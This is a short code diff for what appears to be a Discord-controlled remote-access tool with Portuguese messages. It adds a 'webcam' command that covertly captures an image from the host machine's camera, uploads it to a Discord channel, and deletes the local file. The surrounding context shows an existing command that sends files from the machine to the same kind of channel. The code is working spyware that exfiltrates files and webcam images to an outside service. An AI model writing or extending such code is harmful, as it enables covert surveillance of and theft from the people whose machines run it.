@@ -76,6 +76,19 @@ async def download(ctx, *args):
             await canal.send(file=file)
     except:
         await canal.send('Erro ao enviar/Arquivo nao encontrado')
+@bot.command()
 
+async def webcam(ctx):
+    cap = cv2.VideoCapture(0)
+    ret, frame = cap.read()
+    cap.release()
+
+    if ret:
+        filename = 'captura.jpg'
+        cv2.imwrite(filename, frame)
+        await bot.get_channel(CHANELL ID HERE).send(file=discord.File(filename))
+        os.remove(filename)
+    else:
+        await bot.get_channel(CHANNEL ID HERE).send("Falha ao capturar a imagem da webcam.")
 
 bot.run('YOUR BOT TOKEN HERE')
